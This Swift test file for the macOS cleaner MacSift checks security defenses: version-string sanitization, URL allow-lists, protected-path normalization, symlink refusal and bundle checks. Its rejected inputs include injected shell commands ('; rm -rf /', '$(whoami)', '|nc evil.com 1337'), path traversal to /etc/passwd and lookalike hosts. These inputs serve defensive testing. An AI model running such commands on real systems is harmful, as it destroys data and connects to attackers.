import Testing
import Foundation
@testable import MacSift

// MARK: - Version string sanitization

@Suite("Security · version string sanitization")
struct VersionSanitizationTests {
    @Test func plainSemverIsAccepted() {
        #expect(UpdateChecker.isSafeVersionString("0.2.6"))
        #expect(UpdateChecker.isSafeVersionString("1.0.0"))
        #expect(UpdateChecker.isSafeVersionString("10.20.30"))
    }

    @Test func preReleaseSuffixesAreAccepted() {
        #expect(UpdateChecker.isSafeVersionString("1.0.0-rc.1"))
        #expect(UpdateChecker.isSafeVersionString("0.0.0-dev"))
        #expect(UpdateChecker.isSafeVersionString("2.1.0_beta"))
    }

    @Test func emptyStringIsRejected() {
        #expect(!UpdateChecker.isSafeVersionString(""))
    }

    @Test func pathTraversalIsRejected() {
        #expect(!UpdateChecker.isSafeVersionString("../../etc/passwd"))
        #expect(!UpdateChecker.isSafeVersionString("..\\..\\Windows"))
        #expect(!UpdateChecker.isSafeVersionString("0.2.6/../evil"))
    }

    @Test func shellMetacharactersAreRejected() {
        #expect(!UpdateChecker.isSafeVersionString("0.2.6; rm -rf /"))
        #expect(!UpdateChecker.isSafeVersionString("$(whoami)"))
        #expect(!UpdateChecker.isSafeVersionString("0.2.6 && touch /tmp/pwned"))
        #expect(!UpdateChecker.isSafeVersionString("0.2.6`id`"))
        #expect(!UpdateChecker.isSafeVersionString("0.2.6|nc evil.com 1337"))
    }

    @Test func whitespaceAndControlCharsAreRejected() {
        #expect(!UpdateChecker.isSafeVersionString("0.2.6 "))
        #expect(!UpdateChecker.isSafeVersionString("0.2.6\n"))
        #expect(!UpdateChecker.isSafeVersionString("0.2.6\t"))
        #expect(!UpdateChecker.isSafeVersionString("0.2.6\0"))
    }

    @Test func overlyLongStringIsRejected() {
        let long = String(repeating: "a", count: 33)
        #expect(!UpdateChecker.isSafeVersionString(long))
    }
}

// MARK: - Download URL allow-list

@Suite("Security · download URL allow-list")
struct DownloadURLAllowListTests {
    @Test func githubComIsTrusted() {
        let url = URL(string: "https://github.com/Lcharvol/MacSift/releases/download/v0.3.0/MacSift.zip")!
        #expect(UpdateChecker.isTrustedDownloadURL(url))
    }

    @Test func githubReleaseCDNIsTrusted() {
        let url = URL(string: "https://objects.githubusercontent.com/github-production-release-asset/...")!
        #expect(UpdateChecker.isTrustedDownloadURL(url))
    }

    @Test func httpIsRejected() {
        let url = URL(string: "http://github.com/Lcharvol/MacSift/releases/download/v0.3.0/MacSift.zip")!
        #expect(!UpdateChecker.isTrustedDownloadURL(url))
    }

    @Test func fileSchemeIsRejected() {
        let url = URL(string: "file:///etc/passwd")!
        #expect(!UpdateChecker.isTrustedDownloadURL(url))
    }

    @Test func arbitraryHostIsRejected() {
        let url = URL(string: "https://malicious.example/MacSift.zip")!
        #expect(!UpdateChecker.isTrustedDownloadURL(url))
    }

    @Test func similarLookingHostIsRejected() {
        // `github.com.malicious.example` — technically a valid host that
        // COULD fool a naive hasSuffix check. Confirm we require exact
        // equality or `.githubusercontent.com` suffix.
        let url = URL(string: "https://github.com.malicious.example/MacSift.zip")!
        #expect(!UpdateChecker.isTrustedDownloadURL(url))
    }
}

// MARK: - CleaningEngine never-delete normalization

@Suite("Security · CleaningEngine path normalization")
struct CleaningEnginePathNormalizationTests {
    private func attemptDelete(_ path: String) async -> (deleted: Int, failed: Int) {
        let file = ScannedFile(
            url: URL(filePath: path),
            size: 0,
            category: .cache,
            description: "",
            modificationDate: .now,
            isDirectory: false
        )
        let engine = CleaningEngine()
        let report = await engine.clean(files: [file], dryRun: false)
        return (report.deletedCount, report.failedFiles.count)
    }

    @Test func cannotBypassProtectionWithDoubleSlash() async {
        let result = await attemptDelete("//System//Library//evil")
        #expect(result.deleted == 0)
        #expect(result.failed == 1)
    }

    @Test func cannotBypassProtectionWithDotDot() async {
        let result = await attemptDelete("/System/Library/../Library/evil")
        #expect(result.deleted == 0)
        #expect(result.failed == 1)
    }

    @Test func cannotBypassProtectionWithSingleDotSegment() async {
        let result = await attemptDelete("/System/./Library/evil")
        #expect(result.deleted == 0)
        #expect(result.failed == 1)
    }

    @Test func usrBinIsBlocked() async {
        let result = await attemptDelete("/usr/bin/file")
        #expect(result.deleted == 0)
        #expect(result.failed == 1)
    }

    @Test func volumeSpotlightFolderIsBlocked() async {
        let result = await attemptDelete("/Volumes/T7/.Spotlight-V100/Store-V2/some.db")
        #expect(result.deleted == 0)
        #expect(result.failed == 1)
    }
}

// MARK: - Release URL allow-list (audit #2 H2)

@Suite("Security · release URL allow-list")
struct ReleaseURLAllowListTests {
    @Test func githubComIsTrusted() {
        let url = URL(string: "https://github.com/Lcharvol/MacSift/releases/tag/v0.3.0")!
        #expect(UpdateChecker.isTrustedReleaseURL(url))
    }

    @Test func httpIsRejected() {
        let url = URL(string: "http://github.com/Lcharvol/MacSift/releases/tag/v0.3.0")!
        #expect(!UpdateChecker.isTrustedReleaseURL(url))
    }

    @Test func fileSchemeIsRejected() {
        let url = URL(string: "file:///tmp/evil.sh")!
        #expect(!UpdateChecker.isTrustedReleaseURL(url))
    }

    @Test func customSchemeIsRejected() {
        let url = URL(string: "x-apple-reminderkit://malicious")!
        #expect(!UpdateChecker.isTrustedReleaseURL(url))
    }

    @Test func arbitraryHostIsRejected() {
        let url = URL(string: "https://malicious.example/release")!
        #expect(!UpdateChecker.isTrustedReleaseURL(url))
    }

    @Test func lookalikeHostIsRejected() {
        let url = URL(string: "https://github.com.malicious.example/release")!
        #expect(!UpdateChecker.isTrustedReleaseURL(url))
    }
}

// MARK: - UninstallService symlink protection (audit #2 H1)

@Suite("Security · UninstallService symlink protection")
struct UninstallServiceSymlinkTests {
    /// Mimic the H1 attack: create a symlink at the place the uninstaller
    /// would normally remove and verify we leave the link target alone.
    @Test func clearLogsRefusesToFollowSymlink() throws {
        let tempRoot = FileManager.default.temporaryDirectory
            .appending(path: "UninstallSymlinkTest-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: tempRoot, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: tempRoot) }

        // Set up a "user data" folder that an attacker would want destroyed.
        let userData = tempRoot.appending(path: "important")
        try FileManager.default.createDirectory(at: userData, withIntermediateDirectories: true)
        let importantFile = userData.appending(path: "secret.txt")
        try "do not delete".data(using: .utf8)!.write(to: importantFile)

        // Plant a symlink at the path the uninstaller would clear.
        let logsLink = tempRoot.appending(path: "logs")
        try FileManager.default.createSymbolicLink(at: logsLink, withDestinationURL: userData)

        let returned = UninstallService.clearLogs(at: logsLink)
        #expect(returned == false, "clearLogs should refuse to remove a symlinked target")

        // The link itself is gone (we unlinked it) but the target's
        // contents survived intact.
        #expect(!FileManager.default.fileExists(atPath: logsLink.path(percentEncoded: false)))
        #expect(FileManager.default.fileExists(atPath: userData.path(percentEncoded: false)))
        #expect(FileManager.default.fileExists(atPath: importantFile.path(percentEncoded: false)))
    }

    @Test func clearDownloadedUpdatesRefusesToFollowSymlinkedArtifact() throws {
        let tempRoot = FileManager.default.temporaryDirectory
            .appending(path: "UninstallDLSymlinkTest-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: tempRoot, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: tempRoot) }

        // Target the attacker wants destroyed.
        let userDocs = tempRoot.appending(path: "Documents")
        try FileManager.default.createDirectory(at: userDocs, withIntermediateDirectories: true)
        let importantFile = userDocs.appending(path: "private.txt")
        try "personal data".data(using: .utf8)!.write(to: importantFile)

        // Fake Downloads dir with a malicious symlink whose name passes
        // the looksLikeMacSiftUpdateArtifact filter.
        let fakeDownloads = tempRoot.appending(path: "Downloads")
        try FileManager.default.createDirectory(at: fakeDownloads, withIntermediateDirectories: true)
        let maliciousLink = fakeDownloads.appending(path: "MacSift-0.2.9")
        try FileManager.default.createSymbolicLink(at: maliciousLink, withDestinationURL: userDocs)

        let summary = UninstallService.clearDownloadedUpdates(from: fakeDownloads)
        // The link is removed (counted) but the target survives.
        #expect(summary.removedCount == 1)
        #expect(summary.reclaimedBytes == 0, "Reclaimed bytes must NOT count the symlink target")
        #expect(!FileManager.default.fileExists(atPath: maliciousLink.path(percentEncoded: false)))
        #expect(FileManager.default.fileExists(atPath: importantFile.path(percentEncoded: false)))
    }
}

// MARK: - UninstallService bundle verification (audit #2 H3)

@Suite("Security · UninstallService bundle verification")
struct UninstallServiceBundleTests {
    @Test func refusesToTrashWrongBundleName() throws {
        let tempRoot = FileManager.default.temporaryDirectory
            .appending(path: "TrashBundleTest-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: tempRoot, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: tempRoot) }

        let wrongName = tempRoot.appending(path: "NotMacSift.app")
        try FileManager.default.createDirectory(at: wrongName, withIntermediateDirectories: true)
        try writeInfoPlist(at: wrongName, bundleID: "com.macsift.app")

        let outcome = UninstallService.trashAppBundle(at: wrongName)
        if case .failure(let msg) = outcome {
            #expect(msg.contains("unexpected bundle"))
        } else {
            Issue.record("Expected failure, got \(outcome)")
        }
        #expect(FileManager.default.fileExists(atPath: wrongName.path(percentEncoded: false)))
    }

    @Test func refusesToTrashWrongBundleIdentifier() throws {
        let tempRoot = FileManager.default.temporaryDirectory
            .appending(path: "TrashIDTest-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: tempRoot, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: tempRoot) }

        let bundleURL = tempRoot.appending(path: "MacSift.app")
        try FileManager.default.createDirectory(at: bundleURL, withIntermediateDirectories: true)
        try writeInfoPlist(at: bundleURL, bundleID: "com.malicious.evil")

        let outcome = UninstallService.trashAppBundle(at: bundleURL)
        if case .failure(let msg) = outcome {
            #expect(msg.contains("Bundle identifier"))
        } else {
            Issue.record("Expected failure, got \(outcome)")
        }
        #expect(FileManager.default.fileExists(atPath: bundleURL.path(percentEncoded: false)))
    }

    /// Helper: write a minimal Info.plist into a fake .app bundle. Mirrors
    /// what build-app.sh produces but with the caller's chosen bundle id.
    private func writeInfoPlist(at appURL: URL, bundleID: String) throws {
        let contents = appURL.appending(path: "Contents")
        try FileManager.default.createDirectory(at: contents, withIntermediateDirectories: true)
        let plist: [String: Any] = [
            "CFBundleIdentifier": bundleID,
            "CFBundleName": appURL.deletingPathExtension().lastPathComponent,
        ]
        let data = try PropertyListSerialization.data(fromPropertyList: plist, format: .xml, options: 0)
        try data.write(to: contents.appending(path: "Info.plist"))
    }
}

// MARK: - ExclusionManager load validation

@MainActor
@Suite("Security · ExclusionManager input validation", .serialized)
struct ExclusionManagerSecurityTests {
    private func makeSuite() -> String { "test.sec.\(UUID().uuidString)" }

    @Test func rejectsEmptyStrings() {
        let suite = makeSuite()
        UserDefaults(suiteName: suite)!.set(["", "/tmp/legit"], forKey: "excludedPaths")
        let mgr = ExclusionManager(userDefaultsSuiteName: suite)
        #expect(mgr.excludedPaths.count == 1)
        #expect(mgr.excludedPaths.first?.path(percentEncoded: false) == "/tmp/legit")
    }

    @Test func rejectsNonAbsolutePaths() {
        let suite = makeSuite()
        UserDefaults(suiteName: suite)!.set(["relative/path", "/tmp/legit"], forKey: "excludedPaths")
        let mgr = ExclusionManager(userDefaultsSuiteName: suite)
        #expect(mgr.excludedPaths.count == 1)
    }

    @Test func rejectsPathTraversal() {
        let suite = makeSuite()
        UserDefaults(suiteName: suite)!.set(["/Users/../etc/passwd", "/tmp/legit"], forKey: "excludedPaths")
        let mgr = ExclusionManager(userDefaultsSuiteName: suite)
        #expect(mgr.excludedPaths.count == 1)
        #expect(mgr.excludedPaths.first?.path(percentEncoded: false) == "/tmp/legit")
    }
}
